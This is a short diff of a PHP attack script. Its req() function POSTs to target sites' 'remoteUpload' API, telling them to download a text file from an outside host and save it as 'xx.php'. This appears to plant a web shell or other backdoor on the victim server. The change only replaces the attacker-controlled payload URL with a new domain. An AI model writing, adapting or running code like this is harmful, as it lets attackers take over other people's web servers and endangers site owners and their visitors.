@@ -6,7 +6,7 @@ function req($url) {
 	$ch = curl_init();
 	curl_setopt($ch, CURLOPT_URL, $url);
 	curl_setopt($ch, CURLOPT_POST, true);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, "api=remoteUpload&dir=&filename=xx.php&method=curl&url=http://naxtarrr.000webhostapp.com/xx.txt");
+	curl_setopt($ch, CURLOPT_POSTFIELDS, "api=remoteUpload&dir=&filename=xx.php&method=curl&url=http://naxtarrr.fortysinc.com/nax.txt");
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 	$xx = curl_exec($ch);
 	curl_close($ch);
